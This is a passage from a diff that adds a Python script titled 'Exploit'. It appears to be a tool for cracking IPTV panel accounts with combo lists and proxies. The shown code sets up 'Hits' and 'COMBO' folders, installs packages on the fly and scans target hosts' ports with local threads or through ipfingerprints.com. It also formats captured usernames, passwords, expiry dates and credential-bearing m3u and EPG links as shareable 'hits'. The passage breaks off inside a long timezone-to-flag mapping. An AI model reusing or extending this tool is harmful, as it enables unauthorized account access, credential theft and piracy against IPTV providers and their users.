@@ -1,0 +1,2068 @@
+import os, pip, sys, copy, re
+import functools, json, string
+import threading, codecs, select
+import datetime, time, struct
+from datetime import date
+from queue import PriorityQueue
+from socket import AF_INET, socket
+from socket import SOCK_STREAM
+from concurrent.futures import ThreadPoolExecutor, thread
+from urllib.parse import urlparse
+from optparse import OptionParser
+from _socket import SHUT_RDWR
+from collections import deque
+try:
+    import m3u8
+except:
+    pip.main(['install', 'm3u8'])
+    import m3u8
+
+try:
+    import colorama
+except:
+    pip.main(['install', 'colorama'])
+
+from colorama import Fore,Back, init
+init()
+try:
+    import androidhelper as sl4a
+
+    ad = sl4a.Android()
+except:
+    pass
+
+try:
+    import threading
+except:
+    pass
+
+try:
+    import requests
+    import cfscrape
+except:
+    print("requests module not found \n requests module installing now... \n")
+    pip.main(['install', 'requests'])
+import requests
+import urllib3
+try:
+    import sock
+except:
+    print("sock module not found \n sock module installing now \n")
+    pip.main(['install', 'requests[socks]'])
+    pip.main(['install', 'sock'])
+    pip.main(['install', 'socks'])
+    pip.main(['install', 'PySocks'])
+
+try:
+    import openpyxl
+except:
+    print("openpyxl  module not found \n xlsxwriter module installing now \n")
+    pip.main(['install', 'openpyxl'])
+    pip.main(['install', 'requests[openpyxl]'])
+from openpyxl.styles import PatternFill
+from openpyxl.worksheet.dimensions import ColumnDimension, DimensionHolder
+from openpyxl.utils import get_column_letter
+from openpyxl import Workbook
+from openpyxl import load_workbook
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+try:
+    import cfscrape
+
+    sesq2 = requests.Session()
+    ses2 = cfscrape.create_scraper(sess=sesq2)
+except:
+    ses2 = requests.Session()
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+NAME = 'Exploit'
+sys.stdout.write(f"\033]2;{NAME}\007")   
+if not os.path.exists('/sdcard/Hits/𝐄𝐱𝐩𝐥𝐨𝐢𝐭/𝐇𝐈𝐓𝐒/'):
+    os.makedirs('/sdcard/Hits/𝐄𝐱𝐩𝐥𝐨𝐢𝐭/𝐇𝐈𝐓𝐒/')
+if not os.path.exists('/sdcard/Hits/𝐄𝐱𝐩𝐥𝐨𝐢𝐭/𝐌𝟑𝐔/'):
+    os.makedirs('/sdcard/Hits/𝐄𝐱𝐩𝐥𝐨𝐢𝐭/𝐌𝟑𝐔/')
+if not os.path.exists('/sdcard/Hits/𝐄𝐱𝐩𝐥𝐨𝐢𝐭/𝐂𝐎𝐌𝐁𝐎/'):
+    os.makedirs('/sdcard/Hits/𝐄𝐱𝐩𝐥𝐨𝐢𝐭/𝐂𝐎𝐌𝐁𝐎/')
+# Faz a script mostrar as cores no painel
+ESC = '\33['
+RST = ESC + '0m'
+BOLD = ESC + '1m'
+#COLORS
+P = ESC + '30m' # Preto
+PC = ESC + '90m' # cinza
+V = ESC + '31m' # Vermelho
+VC = ESC + '91m' # Vermelho claro
+VD = ESC + '32m' # Verde
+VDC = ESC + '92m' # Verde claro
+A = ESC + '33m' # Amarelo
+AC = ESC + '93m' # Amarelo claro
+AZ = ESC + '34m' # Azul
+AZC = ESC + '94m' # Azul claro
+M = ESC + '35m' # Magenta
+MC = ESC + '95m' # Magenta claro
+C = ESC + '36m' # Ciano
+CC = ESC + '96m' # Ciano claro
+B = ESC + '37m' # Branco
+BC = ESC + '97m' # Branco muito forte
+#EXTRAS COLORS
+VDB = ESC + '1;32m' # Verde + Negrito
+CB = ESC + '97;100m' # Fundo cinza + branco
+PB = ESC + '90;100m' # Fundo cinza + preto
+
+#-----------------VARIABLES MODIFICABLES--------------------------------
+import traceback
+
+PUERTO_INICIO_SCAN=0
+PUERTO_FIN_SCAN=37000
+SCAN_LENTO=0
+SCAN_NORMAL=1
+SCAN_PORTS_LOCAL=0
+SCAN_PORTS_WEB=1
+DEFAULT_VULNERABLES_PORTS={21, 22, 25, 53, 80, 110, 119, 143, 443, 465, 563, 587, 826, 993, 995, 1421, 2052, 2053, 2077, 2078, 2082, 2083, 2086, 2087, 2091, 2095, 2096, 3306, 7080, 7392, 7999, 8080, 8081, 8086, 8443, 8880, 9098, 9112, 9912, 9992, 15001, 24564, 25461, 25461, 25462, 25462, 25463, 25867, 31210, 37000, 45463, 46000, 46500, 43, 443, 444, 25463, 8443, 8444, 8436, 8000, 38305, 60468, 8001, 8002, 8880, 7081, 7082,
+            7083, 7084, 8888, 8007, 8075, 8065, 8081, 8013, 8767, 88, 81, 25555, 80, 8083, 5909, 17655,
+            9992, 18554, 9191, 46000, 6379, 2085, 2083, 2096, 2053, 2082, 1112, 2446, 2095, 2087, 2086,
+            2052, 28506, 25459, 25467, 25222, 7575, 3388, 6758, 6767, 6453, 6923, 28000, 25443, 23000,
+            3500, 24000, 7899, 7474, 25461, 4512, 4935, 5795, 9000, 31000, 9192, 22222, 37500, 41003,
+            41002, 25500, 25000, 7980, 15003, 2406, 32400, 1453, 25613, 4040, 5899, 5777, 25444,8080, 9443,
+            18001, 52000, 6430, 9832, 18003, 9993, 6083, 6053, 4083, 4053, 3083, 3053, 4443, 36000, 18443,
+            15443, 16443, 14443, 18003, 16003, 14003, 5076, 5053, 5083, 3443, 3444, 4444, 25462, 25461,
+            14886, 14861, 14863, 13725, 13727, 13694, 24500, 13745, 14463, 15463, 25443, 2023, 3023, 4023,
+            22, 2095, 2103, 3127, 3260, 3877, 4795, 5319, 10053, 10190, 11270, 12827, 13018, 13494, 17205,
+            18337, 21137, 24056, 24611, 2096, 2087,8585, 9485, 6620, 6430, 6420, 6421, 45463, 10050, 1987,3131,9654,3218,4875,1551,777,7413,7521,1282,15515,9563,8952,4144,8549,9741,7441,6541,5148,9654,61000,64001,24001,16002,37000,8447,25469,1971}
+#-----------------------------------configuraciones--------------------------------------
+hitc=0
+scanPORTTYPE="LOCAL" #WEB O LOCAL
+scanPORTTYPE="WEB"
+debug=False#para imprimir las lineas de depuración True | False
+totalHilosConsumidores=20
+totalHilosProductores=400
+_puertoINICIO_SCAN=0
+_puertoFIN_SCAN=65535
+#-----------------------------------configuraciones--------------------------------------
+import platform
+lock = threading.Lock()
+lockContenedorDatos=threading.Lock()
+version=1.16
+cadena = " \33[30;42mVersion:" + str(version) + "\33[0m"
+
+logopic=(f'''{A}
+\033[38;5;191m  ___          _     _ _   
+\033[38;5;100m | __|_ ___ __| |___(_) |_ 
+\033[38;5;174m | _|\ \ / '_ \ / _ \ |  _|
+\033[38;5;208m |___/_\_\ .__/_\___/_|\__|
+ \033[38;5;222m        |_| 
+{RST}''')
+
+my_os=platform.system()
+hitc=0
+rootDir=""
+if (my_os == "Windows"):
+    rootDir = "."  # windows. the user has to create a directoy with this name, at the same directory  that py script
+else:
+    rootDir = "/sdcard"  # android
+decode_hex = codecs.getdecoder('hex_codec')
+
+#Metodo que crea los directorios usados por el script
+def crearDirectoriosBase():
+    if os.path.exists(rootDir + "/debug") == False:
+        os.mkdir(rootDir + "/debug")
+    if os.path.exists(rootDir + "/hits") == False:
+        os.mkdir(rootDir + "/hits")
+#    if os.path.exists(rootDir + "/Hits/𝐄𝐱𝐩𝐥𝐨𝐢𝐭/𝐂𝐨𝐦𝐛𝐨𝐬𝐄𝐱𝐩𝐥𝐨𝐢𝐭𝐆𝐞𝐫𝐚𝐥") == False:
+#        os.mkdir(rootDir + "/Hits/𝐄𝐱𝐩𝐥𝐨𝐢𝐭/𝐂𝐨𝐦𝐛𝐨𝐬𝐄𝐱𝐩𝐥𝐨𝐢𝐭𝐆𝐞𝐫𝐚𝐥")
+
+global time_
+global hora_ini
+time_ = time.localtime()
+hora_ini = time.strftime('%H:%M ● %d.%m.%Y', time_)
+#---------------------------------------------SCANPORTS--------------------------------------------------
+#clase para localizar los puertos abiertos de una url
+class PortScanner:
+    header1 = {
+        "Host": "www.ipfingerprints.com",
+        "Connection": "keep-alive",
+        "Accept": "application/json, text/javascript,*/*; q=0.01",
+        "Content-Type": f"application/x-www-form-urlencoded",
+        "X-Requested-With": "XMLHttpRequest",
+        "User-Agent":f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 OPR/101.0.0.0",
+        "sec-ch-ua-platform": "\"Windows\"",
+        "Origin": f"https://www.ipfingerprints.com",
+        "Referer": f"https://www.ipfingerprints.com/portscan.php",
+        "Accept-Language": "es-US,es-419;q=0.9,es;q=0.8",
+        "Accept-Encoding": "gzip, deflate"
+        }
+
+    def tratarSalidaPuertos(self,_entrada: dict):
+        # primero separamos por lineas
+        separada: list
+        puertos = []
+        cadena = _entrada['portScanInfo']
+        separada = cadena.split("\n")
+
+        for elemento in separada:
+            if (elemento.find("tcp") >= 0):
+                if (elemento.find("open") >= 0):
+                    pos = elemento.find("/")
+                    puertos.append(int(elemento[:pos]))
+        return puertos
+    def createCoockiePanel(self, _host, _startport, _endport):
+        coockieDat = {
+            "remoteHost": _host,
+            "start_port": _startport,
+            "end_port": _endport,
+            "normalScan": "Yes",
+            "scan_type": "connect",
+            "ping_type": "none"
+        }
+        return coockieDat
+
+    def searchOpenPorts_WEB(self, initPort: int, finishPort: int, ipServerToScan: str):
+        print("\33[32m Scannen von Ports mit der Webmethode:\n ➥  \33[0m", ipServerToScan)
+
+        parametros = self.createCoockiePanel(ipServerToScan, str(initPort), str(finishPort))
+        try:
+            dat = requests.post("https://www.ipfingerprints.com/scripts/getPortsInfo.php", headers=self.header1, data=parametros, timeout=300)  # si en 100 segundos no tenemos respuesta, cancelamos la consulta
+            puertos = self.tratarSalidaPuertos(dat.json())
+            return puertos
+        except Exception as errp:
+            print("Error invocando a url para detectar puertos:", errp)
+            return []
+
+
+#        # metodo que scanea un puerto de una ip
+#        def test_port_number(self, host, port):
+#            # create and configure the socket
+#            with socket(AF_INET, SOCK_STREAM) as sock:
+#                # set a timeout of a few seconds
+#                sock.settimeout(5)
+#                # connecting may fail
+#                try:
+#                    # attempt to connect
+#                    sock.connect((host, port))
+#                    if debug:
+#                        cadena="\t\tPuerto encontrado para:"+ host+ ":"+ str(port)
+#                        print(cadena)
+#                    # a successful connection was made
+#                    sock.shutdown(SHUT_RDWR)
+#                    sock.close()
+#                    return True
+#                except:
+#                    # ignore the failure
+#                    sock.close()
+#                    return False
+
+    #metodo que scanea un puerto de una ip
+    def test_port_number(self,host, port):
+        # create and configure the socket
+        with socket(AF_INET, SOCK_STREAM) as sock:
+            # set a timeout of a few seconds
+            sock.settimeout(5)
+            # connecting may fail
+            try:
+                # attempt to connect
+                sock.connect((host, port))
+                print("Port found for:",host,":",port)
+                # a successful connection was made
+                sock.shutdown(SHUT_RDWR)
+                sock.close()
+                return True
+            except:
+                # ignore the failure
+                sock.close()
+                return False
+
+
+
+#        def port_scan(self, host, port: range, _scanTYPE,_scaneoLento:bool):
+#            if _scanTYPE == SCAN_PORTS_WEB:
+#                return self.searchOpenPorts_WEB(port.start, port.stop, host)
+#            else:
+#                return self.test_port_numberLOCAL(host, port, _scaneoLento)
+
+
+
+    def port_scan(self,host, port:range,_scaneoLento):
+        if scanPORTTYPE=="WEB":
+            return self.searchOpenPorts_WEB(port.start,port.stop,host)
+        if scanPORTTYPE=="LOCAL":
+            return self.test_port_numberLOCAL(host,port,_scaneoLento)
+
+    # scanea un rango de puertos, lanzando multiples  hilos para acelerar el scaneo
+    def test_port_numberLOCAL(self, host, ports, scaneLento:bool):
+        print(f'Scanning Ports with Local Method:{host}...')
+        # create the thread pool
+        totalHilos = len(ports)
+        if scaneLento == True:
+            totalHilos = 1
+        # with ThreadPoolExecutor(len(ports)) as executor:
+        with ThreadPoolExecutor(totalHilos) as executor:
+            # dispatch all tasks
+            # results = executor.map(self.test_port_number, [host] * len(ports), ports)
+            results = executor.map(self.test_port_number, [host] * len(ports), ports)
+            # report results in order
+            openPorts = []
+            for port, is_open in zip(ports, results):  # anlizamos los datos de cada hilo, y los devolvemos en una liusta
+                if is_open:
+                    openPorts.append(port)
+            if (debug):
+                print("Ports:", openPorts)
+            return openPorts
+
+#---------------------------------------------HITDATA----------------------------------------------------
+# class that stores the HIT info
+class HitData:
+    portal = ""
+    url = ""
+    m3uURL = ""
+    user = ""
+    password = ""
+    caducidad = ""
+    outputFormats = ""
+    conexionesActivas = ""
+    maxConexiones = ""
+    timezone = ""
+    panel = ""
+    port = ""
+    real = ""
+    vpn = ""
+    nick = ""
+    accountType = "no data"
+    m3uValid=""
+    serial=""
+    shortSerial=""
+    deviceID1=""
+    deviceID2=""
+    realc = url + ':' + port
+    def setData(self, portalName: str, url: str, m3uUrl: str, user: str, password: str, outputFormats: str, ficheroAsociado: str, puerto: str, nick: str):
+        self.portal = portalName
+        self.panel = portalName
+        self.url = url
+        self.outputFormats = outputFormats
+        self.m3uURL = m3uUrl
+        self.user = user
+        self.password = password
+        self.ficherosSalida = ficheroAsociado
+        self.livelist = liveList
+        self.vodlist = vodList
+        self.serieslist = serieList
+        self.port = puerto
+        self.nick = nick
+        
+    def __str__(self):
+        output = """
+🥷▂▂▂✭𝐓𝐑🔱𝐄✘𝐏✭▂▂▂🥷
+❪❪ 𝕏 ℳ𝟛Ʋ ϻคx ❦ Є✘ρƖοιτ 𝕏 ❫❫
+✪ P➢ http://"""+self.panel+"""
+✪ R ➢ http://"""+self.url+"""
+✪ Poʀᴛ ➢ """+self.port+"""
+✪ Usᴇʀ ➢ """+self.user+"""
+✪ Pᴀss ➢ """+self.password+"""
+✪ Exᴘ ➢ """+self.caducidad+"""
+✪ Cᴏɴɴ ➢ ᴀᴄᴛ‣"""+self.conexionesActivas+""" ⁃ ᴍᴀx‣"""+self.maxConexiones+"""
+✪ ᴍɜᴜ sᴛᴀᴛᴜs ➢ """+self.m3uValid+"""
+✪ Hɪᴛs ʙʏ ☞ """+self.nick+""" ☜
+✪ TZᴏɴᴇ ➢ """+self.timezone+"""
+✪ Foʀᴍᴀᴛs ➢ """+self.outputFormats+"""
+✦ Gᴇᴛ-ᴘʏ👇
+✪ℳ𝟛Ʋ ϻคx ❦ Є✘ρƖοιτ 𝕏 -ᴘʏ
+✪ ❪❪  ᴘʏ ᴄᴏɴғɪɴɢ ʙʏ ɴᴏʙᴏᴅʏ  ❫❫
+▄▄︻デ𝗠𝟯𝗨🔱𝐋𝐢𝐧𝐤1═一 ※ http://"""+self.url+"""/get.php?username="""+self.user+"""&password="""+self.password+"""&type=m3u_plus
+▄▄︻デ𝗠𝟯𝗨🔱𝐋𝐢𝐧𝐤2═一 ※ """+self.m3uURL+"""&output=m3u8
+▄▄︻デ𝗘𝗣𝗚🔱𝐋𝐢𝐧𝐤══一 ※ http://"""+self.url+"""/xmltv.php?username="""+self.user+"""&password="""+self.password
+        if (self.livelist != ""):
+            output = output+"""
+✪ 𝐋𝐈𝐕𝐄●𝐋𝐈𝐒𝐓 ✪
+    ╚{"""+str(self.livelist)+"#𝕃𝕀𝕍𝔼}"
+        return output
+
+#---------------------------------------------SCANPORTS--------------------------------------------------
+
+class InfoServer:
+    lista_puertosIP:dict
+    host:str
+    listaDNS:dict
+    canalesM3U=""
+    def __init__(self):
+        self.lista_puertosIP=dict()
+        self.listaDNS=dict()
+
+# check the combo and hit paths directories
+def checkDirestories():  # each os has its own path
+    if os.path.exists(rootDir + "/combo") == False:
+        os.mkdir(rootDir + "/combo")
+    if os.path.exists(rootDir + "/hits") == False:
+        os.mkdir(rootDir + "/hits")
+    if os.path.exists(rootDir + "/proxies") == False:
+        os.mkdir(rootDir + "/proxies")
+        
+
+
+
+#---------------------------------------------M3U_UTILS--------------------------------------------------
+class M3U_UTILS:
+    HEADER1_M3U = {
+        "Cookie": "stb_lang=en; timezone=Europe%2FIstanbul;",
+        "X-User-Agent": "Model: MAG254; Link: Ethernet",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
+    }
+    def getHeaderM3U_withHOST(self,host):
+        HEADER1_m3u = {
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+            "Accept-Encoding": "gzip,deflate",
+            "Accept-Language": "es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
+            "Connection": "keep-alive",
+            "Host": host,
+            "Upgrade-Insecure-Requests": "1",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76"
+        }
+        return HEADER1_m3u
+    #Metodo que extrae los campos de una peticion de info a una m3u de los datos del usuarios
+    def extractDataFromList(self,user: str, passw: str, reponseMessage: str, panel: str, hitData: HitData):
+        try:
+            hitData.panel = panel
+            hitData.user = user
+            hitData.password = passw
+            acon = ""
+            acon = reponseMessage.split('active_cons":')[1]
+            acon = acon.split(',')[0]
+            acon = acon.replace('"', "")
+            hitData.conexionesActivas = acon
+            mcon = reponseMessage.split('max_connections":')[1]
+            mcon = mcon.split(',')[0]
+            mcon = mcon.replace('"', "")
+            hitData.maxConexiones = mcon
+            timezone = reponseMessage.split('timezone":"')[1]
+            timezone = timezone.split('",')[0]
+            timezone = timezone.split('"}')[0]            
+            timezone = timezone.replace("\/", "/")
+            timezone = timezone.replace('Africa/Windhoek', '🇳🇦Windhoek[NA]')
+            timezone = timezone.replace('Africa/Abidjan', '🇨🇮Abidjan[CI]')
+            timezone = timezone.replace('Africa/Accra', '🇬🇭Accra[GH]')
+            timezone = timezone.replace('Africa/Addis_Ababa', '🇪🇹Addis Ababa[ET]')
+            timezone = timezone.replace('Africa/Algiers', '🇩🇿Algiers[DZ]')
+            timezone = timezone.replace('Africa/Asmara', '🇪🇷Asmara[ER]')
+            timezone = timezone.replace('Africa/Asmera', '🇪🇷Asmera[ER]')
+            timezone = timezone.replace('Africa/Bamako', '🇲🇱Bamako[ML]')
+            timezone = timezone.replace('Africa/Bangui', '🇨🇫Bangui[CF]')
+            timezone = timezone.replace('Africa/Banjul', '🇬🇲Banjul[GM]')
+            timezone = timezone.replace('Africa/Bissau', '🇬🇼Bissau[GW]')
+            timezone = timezone.replace('Africa/Blantyre', '🇲🇼Blantyre[MW]')
+            timezone = timezone.replace('Africa/Brazzaville', '🇨🇬Brazzaville[CG]')
+            timezone = timezone.replace('Africa/Bujumbura', '🇧🇮Bujumbura[BI]')
+            timezone = timezone.replace('Africa/Cairo', '🇪🇬CairoPT[EG]')
+            timezone = timezone.replace('Africa/Casablanca', '🇲🇦Casablanca[MA]')
+            timezone = timezone.replace('Africa/Ceuta', '🇪🇸Ceuta[ES]')
+            timezone = timezone.replace('Africa/Conakry', '🇬🇳Conakry[GN]')
+            timezone = timezone.replace('Africa/Dakar', '🇸🇳Dakar[SN]')
+            timezone = timezone.replace('Africa/Dar_es_Salaam', '🇹🇿Dar es Salaam[TZ]')
+            timezone = timezone.replace('Africa/Djibouti', '🇩🇯Djibouti[DJ]')
+            timezone = timezone.replace('Africa/Douala', '🇨🇲Douala[CM]')
+            timezone = timezone.replace('Africa/El_Aaiun', '🇪🇭El Aaiun[EH]')
+            timezone = timezone.replace('Africa/Freetown', '🇸🇱Freetown[SL]')
+            timezone = timezone.replace('Africa/Gaborone', '🇧🇼Gaborone[BW]')
+            timezone = timezone.replace('Africa/Harare', '🇿🇼Harare[ZW]')
+            timezone = timezone.replace('Africa/Johannesburg', '🇿🇦Johannesburg[ZA]')
+            timezone = timezone.replace('Africa/Juba', '🇸🇸Juba[SS]')
+            timezone = timezone.replace('Africa/Kampala', '🇺🇬Kampala[UG]')
+            timezone = timezone.replace('Africa/Khartoum', '🇸🇩Khartoum[SD]')
+            timezone = timezone.replace('Africa/Kigali', '🇷🇼Kigali[RW]')
+            timezone = timezone.replace('Africa/Kinshasa', '🇨🇩Kinshasa[CD]')
+            timezone = timezone.replace('Africa/Lagos', '🇳🇬Lagos[NG]')
+            timezone = timezone.replace('Africa/Libreville', '🇬🇦Libreville[GA]')
+            timezone = timezone.replace('Africa/Lome', '🇹🇬Lomé[TG]')
+            timezone = timezone.replace('Africa/Luanda', '🇦🇴Luanda[AO]')
+            timezone = timezone.replace('Africa/Lubumbashi', '🇨🇩Lubumbashi[CD]')
+            timezone = timezone.replace('Africa/Lusaka', '🇿🇲Lusaka[ZM]')
+            timezone = timezone.replace('Africa/Malabo', '🇬🇶Malabo[GQ]')
+            timezone = timezone.replace('Africa/Maputo', '🇲🇿Maputo[MZ]')
+            timezone = timezone.replace('Africa/Maseru', '🇱🇸Maseru[LS]')
+            timezone = timezone.replace('Africa/Mbabane', '🇸🇿Mbabane[SZ]')
+            timezone = timezone.replace('Africa/Mogadishu', '🇸🇴Mogadishu[SO]')
+            timezone = timezone.replace('Africa/Monrovia', '🇱🇷Monrovia[LR]')
+            timezone = timezone.replace('Africa/Nairobi', '🇰🇪Nairobi[KE]')
+            timezone = timezone.replace('Africa/Ndjamena', '🇹🇩Ndjamena[TD]')
+            timezone = timezone.replace('Africa/Niamey', '🇳🇪Niamey[NE]')
+            timezone = timezone.replace('Africa/Nouakchott', '🇲🇷Nouakchott[MR]')
+            timezone = timezone.replace('Africa/Ouagadougou', '🇧🇫Ouagadougou[BF]')
+            timezone = timezone.replace('Africa/Porto-Novo', '🇧🇯Porto-Novo[BJ]')
+            timezone = timezone.replace('Africa/Sao_Tome', '🇸🇹São Tomé[ST]')
+            timezone = timezone.replace('Africa/Timbuktu', '🇲🇱Timbuktu[ML]')
+            timezone = timezone.replace('Africa/Tripoli', '🇱🇾Tripoli[LY]')
+            timezone = timezone.replace('Africa/Tunis', '🇹🇳Tunis[TN]')
+            timezone = timezone.replace('America/Adak', '🇺🇸Adak[US]')
+            timezone = timezone.replace('America/Anchorage', '🇺🇸Anchorage[US]')
+            timezone = timezone.replace('America/Anguilla', '🇦🇮Anguilla[AI]')
+            timezone = timezone.replace('America/Antigua', '🇦🇬Antigua[AG]')
+            timezone = timezone.replace('America/Araguaina', '🇧🇷Araguaína[BR]')
+            timezone = timezone.replace('America/Argentina/Buenos_Aires', '🇦🇷Buenos Aires[AR]')
+            timezone = timezone.replace('America/Argentina/Catamarca', '🇦🇷Catamarca[AR]')
+            timezone = timezone.replace('America/Argentina/ComodRivadavia', '🇦🇷ComodRivadavia[AR]')
+            timezone = timezone.replace('America/Argentina/Cordoba', '🇦🇷Córdoba[AR]')
+            timezone = timezone.replace('America/Argentina/Jujuy', '🇦🇷Jujuy[AR]')
+            timezone = timezone.replace('America/Argentina/La_Rioja', '🇦🇷La Rioja[AR]')
+            timezone = timezone.replace('America/Argentina/Mendoza', '🇦🇷Mendoza[AR]')
+            timezone = timezone.replace('America/Argentina/Rio_Gallegos', '🇦🇷Río Gallegos[AR]')
+            timezone = timezone.replace('America/Argentina/Salta', '🇦🇷Salta[AR]')
+            timezone = timezone.replace('America/Argentina/San_Juan', '🇦🇷San Juan[AR]')
+            timezone = timezone.replace('America/Argentina/San_Luis', '🇦🇷San Luis[AR]')
+            timezone = timezone.replace('America/Argentina/Tucuman', '🇦🇷Tucumán[AR]')
+            timezone = timezone.replace('America/Argentina/Ushuaia', '🇦🇷Ushuaia[AR]')
+            timezone = timezone.replace('America/Aruba', '🇦🇼Aruba[AW]')
+            timezone = timezone.replace('America/Asuncion', '🇵🇾Asunción[PY]')
+            timezone = timezone.replace('America/Atikokan', '🇨🇦Atikokan[CA]')
+            timezone = timezone.replace('America/Atka', '🇺🇸Atka[US]')
+            timezone = timezone.replace('America/Bahia', '🇧🇷Bahia[BR]')
+            timezone = timezone.replace('America/Bahia_Banderas', '🇲🇽Bahía Banderas[MX]')
+            timezone = timezone.replace('America/Barbados', '🇧🇧Barbados[BB]')
+            timezone = timezone.replace('America/Belem', '🇧🇷Belém[BR]')
+            timezone = timezone.replace('America/Belize', '🇧🇿Belize[BZ]')
+            timezone = timezone.replace('America/Blanc-Sablon', '🇨🇦Blanc-Sablon[CA]')
+            timezone = timezone.replace('America/Boa_Vista', '🇧🇷Boa Vista[BR]')
+            timezone = timezone.replace('America/Bogota', '🇨🇴Bogotá[CO]')
+            timezone = timezone.replace('America/Boise', '🇺🇸Boise[US]')
+            timezone = timezone.replace('America/Buenos_Aires', '🇦🇷Buenos Aires[AR]')
+            timezone = timezone.replace('America/Cambridge_Bay', '🇨🇦Cambridge Bay[CA]')
+            timezone = timezone.replace('America/Campo_Grande', '🇧🇷Campo Grande[BR]')
+            timezone = timezone.replace('America/Cancun', '🇲🇽Cancún[MX]')
+            timezone = timezone.replace('America/Caracas', '🇻🇪Caracas[VE]')
+            timezone = timezone.replace('America/Catamarca', '🇦🇷Catamarca[AR]')
+            timezone = timezone.replace('America/Cayenne', '🇬🇫Cayenne[GF]')
+            timezone = timezone.replace('America/Cayman', '🇰🇾Cayman[KY]')
+            timezone = timezone.replace('America/Chicago', '🇺🇸Chicago[US]')
+            timezone = timezone.replace('America/Chihuahua', '🇲🇽Chihuahua[MX]')
+            timezone = timezone.replace('America/Ciudad_Juarez', '🇲🇽Ciudad Juárez[MX]')
+            timezone = timezone.replace('America/Coral_Harbour', '🇨🇦Coral Harbour[CA]')
+            timezone = timezone.replace('America/Cordoba', '🇦🇷Córdoba[AR]')
+            timezone = timezone.replace('America/Costa_Rica', '🇨🇷Costa Rica[CR]')
+            timezone = timezone.replace('America/Creston', '🇨🇦Creston[CA]')
+            timezone = timezone.replace('America/Cuiaba', '🇧🇷Cuiabá[BR]')
+            timezone = timezone.replace('America/Curacao', '🇨🇼Curaçao[CW]')
+            timezone = timezone.replace('America/Danmarkshavn', '🇬🇱Danmarkshavn[GL]')
+            timezone = timezone.replace('America/Dawson', '🇨🇦Dawson[CA]')
+            timezone = timezone.replace('America/Dawson_Creek', '🇨🇦Dawson Creek[CA]')
+            timezone = timezone.replace('America/Denver', '🇺🇸Denver[US]')
+            timezone = timezone.replace('America/Detroit', '🇺🇸Detroit[US]')
+            timezone = timezone.replace('America/Dominica', '🇩🇲Dominica[DM]')
+            timezone = timezone.replace('America/Edmonton', '🇨🇦Edmonton[CA]')
+            timezone = timezone.replace('America/Eirunepe', '🇧🇷Eirunepé[BR]')
+            timezone = timezone.replace('America/El_Salvador', '🇸🇻El Salvador[SV]')
+            timezone = timezone.replace('America/Ensenada', '🇲🇽Ensenada[MX]')
+            timezone = timezone.replace('America/Fort_Nelson', '🇨🇦Fort Nelson[CA]')
+            timezone = timezone.replace('America/Fort_Wayne', '🇺🇸Fort Wayne[US]')
+            timezone = timezone.replace('America/Fortaleza', '🇧🇷Fortaleza[BR]')
+            timezone = timezone.replace('America/Glace_Bay', '🇨🇦Glace Bay[CA]')
+            timezone = timezone.replace('America/Godthab', '🇬🇱Godthåb[GL]')
+            timezone = timezone.replace('America/Goose_Bay', '🇨🇦Goose Bay[CA]')
+            timezone = timezone.replace('America/Grand_Turk', '🇹🇨Grand Turk[TC]')
+            timezone = timezone.replace('America/Grenada', '🇬🇩Grenada[GD]')
+            timezone = timezone.replace('America/Guadeloupe', '🇬🇵Guadeloupe[GP]')
+            timezone = timezone.replace('America/Guatemala', '🇬🇹Guatemala[GT]')
+            timezone = timezone.replace('America/Guayaquil', '🇪🇨Guayaquil[EC]')
+            timezone = timezone.replace('America/Guyana', '🇬🇾Guyana[GY]')
+            timezone = timezone.replace('America/Halifax', '🇨🇦Halifax[CA]')
+            timezone = timezone.replace('America/Havana', '🇨🇺Havana[CU]')
+            timezone = timezone.replace('America/Hermosillo', '🇲🇽Hermosillo[MX]')
+            timezone = timezone.replace('America/Indiana/Indianapolis', '🇺🇸Indianapolis[US]')
+            timezone = timezone.replace('America/Indiana/Knox', '🇺🇸Knox[US]')
+            timezone = timezone.replace('America/Indiana/Marengo', '🇺🇸Marengo[US]')
+            timezone = timezone.replace('America/Indiana/Petersburg', '🇺🇸Petersburg[US]')
+            timezone = timezone.replace('America/Indiana/Tell_City', '🇺🇸Tell City[US]')
+            timezone = timezone.replace('America/Indiana/Vevay', '🇺🇸Vevay[US]')
+            timezone = timezone.replace('America/Indiana/Vincennes', '🇺🇸Vincennes[US]')
